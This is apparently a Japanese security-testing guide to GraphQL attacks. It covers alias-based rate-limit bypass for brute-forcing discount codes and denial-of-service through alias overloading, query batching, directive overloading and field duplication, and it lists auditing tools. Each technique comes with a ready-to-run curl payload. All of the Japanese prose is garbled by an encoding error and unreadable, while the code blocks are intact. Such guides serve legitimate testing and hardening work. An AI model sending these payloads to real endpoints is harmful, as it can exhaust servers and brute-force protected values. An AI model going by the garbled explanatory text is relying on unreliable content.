ã‚¨ã‚¤ãƒªã‚¢ã‚¹ã®ä¸»ãªç›®çš„ã¯å¤šæ•°ã®APIå‘¼ã³å‡ºã—ã®å¿…è¦æ€§ã‚’æ¸›ã‚‰ã™ã“ã¨ã§ã™ãŒã€ã‚¨ã‚¤ãƒªã‚¢ã‚¹ã‚’åˆ©ç”¨ã—ã¦GraphQLã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã«å¯¾ã—ã¦ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹æ”»æ’ƒã‚’å®Ÿè¡Œã™ã‚‹ã¨ã„ã†æ„å›³ã—ãªã„ä½¿ç”¨ä¾‹ãŒç‰¹å®šã•ã‚Œã¦ã„ã¾ã™ã€‚ã“ã‚Œã¯ã€ä¸€éƒ¨ã®ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆãŒãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹æ”»æ’ƒã‚’é˜²ããŸã‚ã«**HTTPãƒªã‚¯ã‚¨ã‚¹ãƒˆã®æ•°**ã‚’åˆ¶é™ã™ã‚‹ãƒ¬ãƒ¼ãƒˆãƒªãƒŸãƒƒã‚¿ãƒ¼ã«ã‚ˆã£ã¦ä¿è­·ã•ã‚Œã¦ã„ã‚‹ãŸã‚å¯èƒ½ã§ã™ã€‚ã—ã‹ã—ã€ã“ã‚Œã‚‰ã®ãƒ¬ãƒ¼ãƒˆãƒªãƒŸãƒƒã‚¿ãƒ¼ã¯ã€å„ãƒªã‚¯ã‚¨ã‚¹ãƒˆå†…ã®æ“ä½œã®æ•°ã‚’è€ƒæ…®ã—ãªã„å ´åˆãŒã‚ã‚Šã¾ã™ã€‚ã‚¨ã‚¤ãƒªã‚¢ã‚¹ã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€å˜ä¸€ã®HTTPãƒªã‚¯ã‚¨ã‚¹ãƒˆå†…ã«è¤‡æ•°ã®ã‚¯ã‚¨ãƒªã‚’å«ã‚ã‚‹ã“ã¨ãŒã§ãã‚‹ãŸã‚ã€ãã®ã‚ˆã†ãªãƒ¬ãƒ¼ãƒˆåˆ¶é™ã‚’å›é¿ã§ãã¾ã™ã€‚

ä»¥ä¸‹ã®ä¾‹ã‚’è€ƒãˆã¦ã¿ã¦ãã ã•ã„ã€‚ã“ã‚Œã¯ã€ã‚¨ã‚¤ãƒªã‚¢ã‚¹ä»˜ãã®ã‚¯ã‚¨ãƒªã‚’ä½¿ç”¨ã—ã¦ã‚¹ãƒˆã‚¢ã®å‰²å¼•ã‚³ãƒ¼ãƒ‰ã®æœ‰åŠ¹æ€§ã‚’ç¢ºèªã™ã‚‹æ–¹æ³•ã‚’ç¤ºã—ã¦ã„ã¾ã™ã€‚ã“ã®æ–¹æ³•ã¯ã€è¤‡æ•°ã®ã‚¯ã‚¨ãƒªã‚’1ã¤ã®HTTPãƒªã‚¯ã‚¨ã‚¹ãƒˆã«ã¾ã¨ã‚ã‚‹ãŸã‚ã€ãƒ¬ãƒ¼ãƒˆåˆ¶é™ã‚’å›é¿ã§ãã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã€åŒæ™‚ã«å¤šæ•°ã®å‰²å¼•ã‚³ãƒ¼ãƒ‰ã®ç¢ºèªã‚’å¯èƒ½ã«ã—ã¾ã™ã€‚
```bash
# Example of a request utilizing aliased queries to check for valid discount codes
query isValidDiscount($code: Int) {
isvalidDiscount(code:$code){
valid
}
isValidDiscount2:isValidDiscount(code:$code){
valid
}
isValidDiscount3:isValidDiscount(code:$code){
valid
}
}
```
## DoS in GraphQL

### Alias Overloading

**Alias Overloading**ã¯ã€æ”»æ’ƒè€…ãŒåŒã˜ãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ã«å¯¾ã—ã¦å¤šãã®ã‚¨ã‚¤ãƒªã‚¢ã‚¹ã§ã‚¯ã‚¨ãƒªã‚’éè² è·ã«ã™ã‚‹GraphQLã®è„†å¼±æ€§ã§ã‚ã‚Šã€ãƒãƒƒã‚¯ã‚¨ãƒ³ãƒ‰ãƒªã‚¾ãƒ«ãƒãŒãã®ãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ã‚’ç¹°ã‚Šè¿”ã—å®Ÿè¡Œã™ã‚‹åŸå› ã¨ãªã‚Šã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã‚µãƒ¼ãƒãƒ¼ãƒªã‚½ãƒ¼ã‚¹ãŒåœ§å€’ã•ã‚Œã€**Denial of Service (DoS)**ã«ã¤ãªãŒã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚ä¾‹ãˆã°ã€ä»¥ä¸‹ã®ã‚¯ã‚¨ãƒªã§ã¯ã€åŒã˜ãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ï¼ˆ`expensiveField`ï¼‰ãŒã‚¨ã‚¤ãƒªã‚¢ã‚¹ã‚’ä½¿ç”¨ã—ã¦1,000å›è¦æ±‚ã•ã‚Œã¦ãŠã‚Šã€ãƒãƒƒã‚¯ã‚¨ãƒ³ãƒ‰ã¯ãã‚Œã‚’1,000å›è¨ˆç®—ã™ã‚‹ã“ã¨ã‚’å¼·ã„ã‚‰ã‚Œã€CPUã‚„ãƒ¡ãƒ¢ãƒªãŒæ¯æ¸‡ã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ï¼š

{% code overflow="wrap" %}
```graphql
# Test provided by https://github.com/dolevf/graphql-cop
curl -X POST -H "Content-Type: application/json" \
-d '{"query": "{ alias0:__typename \nalias1:__typename \nalias2:__typename \nalias3:__typename \nalias4:__typename \nalias5:__typename \nalias6:__typename \nalias7:__typename \nalias8:__typename \nalias9:__typename \nalias10:__typename \nalias11:__typename \nalias12:__typename \nalias13:__typename \nalias14:__typename \nalias15:__typename \nalias16:__typename \nalias17:__typename \nalias18:__typename \nalias19:__typename \nalias20:__typename \nalias21:__typename \nalias22:__typename \nalias23:__typename \nalias24:__typename \nalias25:__typename \nalias26:__typename \nalias27:__typename \nalias28:__typename \nalias29:__typename \nalias30:__typename \nalias31:__typename \nalias32:__typename \nalias33:__typename \nalias34:__typename \nalias35:__typename \nalias36:__typename \nalias37:__typename \nalias38:__typename \nalias39:__typename \nalias40:__typename \nalias41:__typename \nalias42:__typename \nalias43:__typename \nalias44:__typename \nalias45:__typename \nalias46:__typename \nalias47:__typename \nalias48:__typename \nalias49:__typename \nalias50:__typename \nalias51:__typename \nalias52:__typename \nalias53:__typename \nalias54:__typename \nalias55:__typename \nalias56:__typename \nalias57:__typename \nalias58:__typename \nalias59:__typename \nalias60:__typename \nalias61:__typename \nalias62:__typename \nalias63:__typename \nalias64:__typename \nalias65:__typename \nalias66:__typename \nalias67:__typename \nalias68:__typename \nalias69:__typename \nalias70:__typename \nalias71:__typename \nalias72:__typename \nalias73:__typename \nalias74:__typename \nalias75:__typename \nalias76:__typename \nalias77:__typename \nalias78:__typename \nalias79:__typename \nalias80:__typename \nalias81:__typename \nalias82:__typename \nalias83:__typename \nalias84:__typename \nalias85:__typename \nalias86:__typename \nalias87:__typename \nalias88:__typename \nalias89:__typename \nalias90:__typename \nalias91:__typename \nalias92:__typename \nalias93:__typename \nalias94:__typename \nalias95:__typename \nalias96:__typename \nalias97:__typename \nalias98:__typename \nalias99:__typename \nalias100:__typename \n }"}' \
'https://example.com/graphql'
```
{% endcode %}

ã“ã‚Œã‚’è»½æ¸›ã™ã‚‹ãŸã‚ã«ã€ãƒªã‚½ãƒ¼ã‚¹ã®æ‚ªç”¨ã‚’é˜²ããŸã‚ã«ã‚¨ã‚¤ãƒªã‚¢ã‚¹ã‚«ã‚¦ãƒ³ãƒˆåˆ¶é™ã€ã‚¯ã‚¨ãƒªã®è¤‡é›‘ã•åˆ†æã€ã¾ãŸã¯ãƒ¬ãƒ¼ãƒˆåˆ¶é™ã‚’å®Ÿè£…ã—ã¾ã™ã€‚

### **é…åˆ—ãƒ™ãƒ¼ã‚¹ã®ã‚¯ã‚¨ãƒªãƒãƒƒãƒå‡¦ç†**

**é…åˆ—ãƒ™ãƒ¼ã‚¹ã®ã‚¯ã‚¨ãƒªãƒãƒƒãƒå‡¦ç†**ã¯ã€GraphQL APIãŒå˜ä¸€ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆã§è¤‡æ•°ã®ã‚¯ã‚¨ãƒªã‚’ãƒãƒƒãƒå‡¦ç†ã™ã‚‹ã“ã¨ã‚’è¨±å¯ã™ã‚‹è„†å¼±æ€§ã§ã‚ã‚Šã€æ”»æ’ƒè€…ãŒåŒæ™‚ã«å¤§é‡ã®ã‚¯ã‚¨ãƒªã‚’é€ä¿¡ã§ãã‚‹ã‚ˆã†ã«ãªã‚Šã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€ã™ã¹ã¦ã®ãƒãƒƒãƒã‚¯ã‚¨ãƒªãŒä¸¦è¡Œã—ã¦å®Ÿè¡Œã•ã‚Œã€ãƒãƒƒã‚¯ã‚¨ãƒ³ãƒ‰ãŒåœ§å€’ã•ã‚Œã€éå‰°ãªãƒªã‚½ãƒ¼ã‚¹ï¼ˆCPUã€ãƒ¡ãƒ¢ãƒªã€ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹æ¥ç¶šï¼‰ã‚’æ¶ˆè²»ã—ã€æœ€çµ‚çš„ã«ã¯**ã‚µãƒ¼ãƒ“ã‚¹æ‹’å¦ï¼ˆDoSï¼‰**ã«ã¤ãªãŒã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚ãƒãƒƒãƒå†…ã®ã‚¯ã‚¨ãƒªæ•°ã«åˆ¶é™ãŒãªã„å ´åˆã€æ”»æ’ƒè€…ã¯ã“ã‚Œã‚’æ‚ªç”¨ã—ã¦ã‚µãƒ¼ãƒ“ã‚¹ã®å¯ç”¨æ€§ã‚’ä½ä¸‹ã•ã›ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

{% code overflow="wrap" %}
```graphql
# Test provided by https://github.com/dolevf/graphql-cop
curl -X POST -H "User-Agent: graphql-cop/1.13" \
-H "Content-Type: application/json" \
-d '[{"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}]' \
'https://example.com/graphql'
```
{% endcode %}

ã“ã®ä¾‹ã§ã¯ã€10ã®ç•°ãªã‚‹ã‚¯ã‚¨ãƒªãŒ1ã¤ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆã«ãƒãƒƒãƒå‡¦ç†ã•ã‚Œã€ã‚µãƒ¼ãƒãƒ¼ã«ã™ã¹ã¦ã‚’åŒæ™‚ã«å®Ÿè¡Œã•ã›ã‚‹ã“ã¨ã‚’å¼·åˆ¶ã—ã¾ã™ã€‚ã‚ˆã‚Šå¤§ããªãƒãƒƒãƒã‚µã‚¤ã‚ºã‚„è¨ˆç®—ã‚³ã‚¹ãƒˆã®é«˜ã„ã‚¯ã‚¨ãƒªã§æ‚ªç”¨ã•ã‚Œã‚‹ã¨ã€ã‚µãƒ¼ãƒãƒ¼ãŒéè² è·ã«ãªã‚Šã¾ã™ã€‚

### **ãƒ‡ã‚£ãƒ¬ã‚¯ãƒ†ã‚£ãƒ–ã‚ªãƒ¼ãƒãƒ¼ãƒ­ãƒ¼ãƒ‡ã‚£ãƒ³ã‚°è„†å¼±æ€§**

**ãƒ‡ã‚£ãƒ¬ã‚¯ãƒ†ã‚£ãƒ–ã‚ªãƒ¼ãƒãƒ¼ãƒ­ãƒ¼ãƒ‡ã‚£ãƒ³ã‚°**ã¯ã€GraphQLã‚µãƒ¼ãƒãƒ¼ãŒéå‰°ã§é‡è¤‡ã—ãŸãƒ‡ã‚£ãƒ¬ã‚¯ãƒ†ã‚£ãƒ–ã‚’æŒã¤ã‚¯ã‚¨ãƒªã‚’è¨±å¯ã™ã‚‹å ´åˆã«ç™ºç”Ÿã—ã¾ã™ã€‚ã“ã‚Œã¯ã€ã‚µãƒ¼ãƒãƒ¼ã®ãƒ‘ãƒ¼ã‚µãƒ¼ã¨ã‚¨ã‚°ã‚¼ã‚­ãƒ¥ãƒ¼ã‚¿ãƒ¼ã‚’åœ§å€’ã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã€ç‰¹ã«ã‚µãƒ¼ãƒãƒ¼ãŒåŒã˜ãƒ‡ã‚£ãƒ¬ã‚¯ãƒ†ã‚£ãƒ–ãƒ­ã‚¸ãƒƒã‚¯ã‚’ç¹°ã‚Šè¿”ã—å‡¦ç†ã™ã‚‹å ´åˆã«é¡•è‘—ã§ã™ã€‚é©åˆ‡ãªæ¤œè¨¼ã‚„åˆ¶é™ãŒãªã„å ´åˆã€æ”»æ’ƒè€…ã¯å¤šæ•°ã®é‡è¤‡ãƒ‡ã‚£ãƒ¬ã‚¯ãƒ†ã‚£ãƒ–ã‚’æŒã¤ã‚¯ã‚¨ãƒªã‚’ä½œæˆã™ã‚‹ã“ã¨ã§ã€è¨ˆç®—ã¾ãŸã¯ãƒ¡ãƒ¢ãƒªä½¿ç”¨é‡ã‚’é«˜ã‚ã€**ã‚µãƒ¼ãƒ“ã‚¹æ‹’å¦ï¼ˆDoSï¼‰**ã‚’å¼•ãèµ·ã“ã™ã“ã¨ãŒã§ãã¾ã™ã€‚

{% code overflow="wrap" %}
```bash
# Test provided by https://github.com/dolevf/graphql-cop
curl -X POST -H "User-Agent: graphql-cop/1.13" \
-H "Content-Type: application/json" \
-d '{"query": "query cop { __typename @aa@aa@aa@aa@aa@aa@aa@aa@aa@aa }", "operationName": "cop"}' \
'https://example.com/graphql'
```
{% endcode %}

å‰ã®ä¾‹ã§ã¯ã€`@aa`ã¯**å®£è¨€ã•ã‚Œã¦ã„ãªã„å¯èƒ½æ€§ãŒã‚ã‚‹**ã‚«ã‚¹ã‚¿ãƒ ãƒ‡ã‚£ãƒ¬ã‚¯ãƒ†ã‚£ãƒ–ã§ã‚ã‚‹ã“ã¨ã«æ³¨æ„ã—ã¦ãã ã•ã„ã€‚é€šå¸¸å­˜åœ¨ã™ã‚‹ä¸€èˆ¬çš„ãªãƒ‡ã‚£ãƒ¬ã‚¯ãƒ†ã‚£ãƒ–ã¯**`@include`**ã§ã™ï¼š

{% code overflow="wrap" %}
```bash
curl -X POST \
-H "Content-Type: application/json" \
-d '{"query": "query cop { __typename @include(if: true) @include(if: true) @include(if: true) @include(if: true) @include(if: true) }", "operationName": "cop"}' \
'https://example.com/graphql'
```
{% endcode %}

å®£è¨€ã•ã‚ŒãŸã™ã¹ã¦ã®ãƒ‡ã‚£ãƒ¬ã‚¯ãƒ†ã‚£ãƒ–ã‚’ç™ºè¦‹ã™ã‚‹ãŸã‚ã«ã€ã‚¤ãƒ³ãƒˆãƒ­ã‚¹ãƒšã‚¯ã‚·ãƒ§ãƒ³ã‚¯ã‚¨ãƒªã‚’é€ä¿¡ã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ï¼š
```bash
curl -X POST \
-H "Content-Type: application/json" \
-d '{"query": "{ __schema { directives { name locations args { name type { name kind ofType { name } } } } } }"}' \
'https://example.com/graphql'
```
ãã—ã¦**ã„ãã¤ã‹ã®ã‚«ã‚¹ã‚¿ãƒ **ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚

### **ãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰é‡è¤‡è„†å¼±æ€§**

**ãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰é‡è¤‡**ã¯ã€GraphQLã‚µãƒ¼ãƒãƒ¼ãŒåŒã˜ãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ã‚’éå‰°ã«ç¹°ã‚Šè¿”ã™ã‚¯ã‚¨ãƒªã‚’è¨±å¯ã™ã‚‹è„†å¼±æ€§ã§ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€ã‚µãƒ¼ãƒãƒ¼ã¯å„ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã®ãŸã‚ã«ãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ã‚’å†—é•·ã«è§£æ±ºã™ã‚‹å¿…è¦ãŒã‚ã‚Šã€é‡è¦ãªãƒªã‚½ãƒ¼ã‚¹ï¼ˆCPUã€ãƒ¡ãƒ¢ãƒªã€ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹å‘¼ã³å‡ºã—ï¼‰ã‚’æ¶ˆè²»ã—ã¾ã™ã€‚æ”»æ’ƒè€…ã¯ä½•ç™¾ã¾ãŸã¯ä½•åƒã‚‚ã®ç¹°ã‚Šè¿”ã•ã‚ŒãŸãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ã‚’æŒã¤ã‚¯ã‚¨ãƒªã‚’ä½œæˆã§ãã€é«˜è² è·ã‚’å¼•ãèµ·ã“ã—ã€æœ€çµ‚çš„ã«ã¯**ã‚µãƒ¼ãƒ“ã‚¹æ‹’å¦ï¼ˆDoSï¼‰**ã«ã¤ãªãŒã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚
```bash
# Test provided by https://github.com/dolevf/graphql-cop
curl -X POST -H "User-Agent: graphql-cop/1.13" -H "Content-Type: application/json" \
-d '{"query": "query cop { __typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n} ", "operationName": "cop"}' \
'https://example.com/graphql'
```
## ãƒ„ãƒ¼ãƒ«

### è„†å¼±æ€§ã‚¹ã‚­ãƒ£ãƒŠãƒ¼

* [https://github.com/dolevf/graphql-cop](https://github.com/dolevf/graphql-cop): graphql ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã®ä¸€èˆ¬çš„ãªèª¤è¨­å®šã‚’ãƒ†ã‚¹ãƒˆã—ã¾ã™
* [https://github.com/assetnote/batchql](https://github.com/assetnote/batchql): ãƒãƒƒãƒ GraphQL ã‚¯ã‚¨ãƒªã¨ãƒŸãƒ¥ãƒ¼ãƒ†ãƒ¼ã‚·ãƒ§ãƒ³ã®å®Ÿè¡Œã«ç„¦ç‚¹ã‚’å½“ã¦ãŸ GraphQL ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ç›£æŸ»ã‚¹ã‚¯ãƒªãƒ—ãƒˆã€‚
* [https://github.com/dolevf/graphw00f](https://github.com/dolevf/graphw00f): ä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹ graphql ã®ãƒ•ã‚£ãƒ³ã‚¬ãƒ¼ãƒ—ãƒªãƒ³ãƒ†ã‚£ãƒ³ã‚°
* [https://github.com/gsmith257-cyber/GraphCrawler](https://github.com/gsmith257-cyber/GraphCrawler): ã‚¹ã‚­ãƒ¼ãƒã‚’å–å¾—ã—ã€æ©Ÿå¯†ãƒ‡ãƒ¼ã‚¿ã‚’æ¤œç´¢ã—ã€èªå¯ã‚’ãƒ†ã‚¹ãƒˆã—ã€ã‚¹ã‚­ãƒ¼ãƒã‚’ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹ã—ã€ç‰¹å®šã®ã‚¿ã‚¤ãƒ—ã¸ã®ãƒ‘ã‚¹ã‚’è¦‹ã¤ã‘ã‚‹ãŸã‚ã«ä½¿ç”¨ã§ãã‚‹ãƒ„ãƒ¼ãƒ«ã‚­ãƒƒãƒˆã€‚
* [https://blog.doyensec.com/2020/03/26/graphql-scanner.html](https://blog.doyensec.com/2020/03/26/graphql-scanner.html): ã‚¹ã‚¿ãƒ³ãƒ‰ã‚¢ãƒ­ãƒ³ã¾ãŸã¯ [Burp æ‹¡å¼µæ©Ÿèƒ½](https://github.com/doyensec/inql)ã¨ã—ã¦ä½¿ç”¨ã§ãã¾ã™ã€‚
* [https://github.com/swisskyrepo/GraphQLmap](https://github.com/swisskyrepo/GraphQLmap): CLI ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã¨ã—ã¦ã‚‚ä½¿ç”¨ã§ãã€æ”»æ’ƒã‚’è‡ªå‹•åŒ–ã—ã¾ã™
* [https://gitlab.com/dee-see/graphql-path-enum](https://gitlab.com/dee-see/graphql-path-enum): **GraphQL ã‚¹ã‚­ãƒ¼ãƒå†…ã®ç‰¹å®šã®ã‚¿ã‚¤ãƒ—ã«åˆ°é”ã™ã‚‹ãŸã‚ã®ã•ã¾ã–ã¾ãªæ–¹æ³•ã‚’ãƒªã‚¹ãƒˆã™ã‚‹ãƒ„ãƒ¼ãƒ«**ã€‚
* [https://github.com/doyensec/GQLSpection](https://github.com/doyensec/GQLSpection): InQL ã®ã‚¹ã‚¿ãƒ³ãƒ‰ã‚¢ãƒ­ãƒ³ãŠã‚ˆã³ CLI ãƒ¢ãƒ¼ãƒ‰ã®å¾Œç¶™
* [https://github.com/doyensec/inql](https://github.com/doyensec/inql): é«˜åº¦ãª GraphQL ãƒ†ã‚¹ãƒˆç”¨ã® Burp æ‹¡å¼µæ©Ÿèƒ½ã€‚_**ã‚¹ã‚­ãƒ£ãƒŠãƒ¼**_ã¯ InQL v5.0 ã®ã‚³ã‚¢ã§ã‚ã‚Šã€GraphQL ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã¾ãŸã¯ãƒ­ãƒ¼ã‚«ãƒ«ã®ã‚¤ãƒ³ãƒˆãƒ­ã‚¹ãƒšã‚¯ã‚·ãƒ§ãƒ³ã‚¹ã‚­ãƒ¼ãƒãƒ•ã‚¡ã‚¤ãƒ«ã‚’åˆ†æã§ãã¾ã™ã€‚ã™ã¹ã¦ã®å¯èƒ½ãªã‚¯ã‚¨ãƒªã¨ãƒŸãƒ¥ãƒ¼ãƒ†ãƒ¼ã‚·ãƒ§ãƒ³ã‚’è‡ªå‹•ç”Ÿæˆã—ã€åˆ†æã®ãŸã‚ã«æ§‹é€ åŒ–ã•ã‚ŒãŸãƒ“ãƒ¥ãƒ¼ã«æ•´ç†ã—ã¾ã™ã€‚_**ã‚¢ã‚¿ãƒƒã‚«ãƒ¼**_ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€ãƒãƒƒãƒ GraphQL æ”»æ’ƒã‚’å®Ÿè¡Œã§ãã€å®Ÿè£…ãŒä¸ååˆ†ãªãƒ¬ãƒ¼ãƒˆåˆ¶é™ã‚’å›é¿ã™ã‚‹ã®ã«å½¹ç«‹ã¡ã¾ã™ã€‚
* [https://github.com/nikitastupin/clairvoyance](https://github.com/nikitastupin/clairvoyance): ä¸€éƒ¨ã® Graphql ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã®åŠ©ã‘ã‚’å€Ÿã‚Šã¦ã€ã‚¤ãƒ³ãƒˆãƒ­ã‚¹ãƒšã‚¯ã‚·ãƒ§ãƒ³ãŒç„¡åŠ¹ã«ãªã£ã¦ã„ã¦ã‚‚ã‚¹ã‚­ãƒ¼ãƒã‚’å–å¾—ã—ã‚ˆã†ã¨ã—ã¾ã™ã€‚

### ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆ

* [https://github.com/graphql/graphiql](https://github.com/graphql/graphiql): GUI ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆ
* [https://altair.sirmuel.design/](https://altair.sirmuel.design/): GUI ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆ

### è‡ªå‹•ãƒ†ã‚¹ãƒˆ

{% embed url="https://graphql-dashboard.herokuapp.com/" %}

* AutoGraphQL ã‚’èª¬æ˜ã™ã‚‹ãƒ“ãƒ‡ã‚ª: [https://www.youtube.com/watch?v=JJmufWfVvyU](https://www.youtube.com/watch?v=JJmufWfVvyU)

## å‚è€ƒæ–‡çŒ®

* [**https://jondow.eu/practical-graphql-attack-vectors/**](https://jondow.eu/practical-graphql-attack-vectors/)
* [**https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696**](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
* [**https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4**](https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4)
* [**http://ghostlulz.com/api-hacking-graphql/**](http://ghostlulz.com/api-hacking-graphql/)
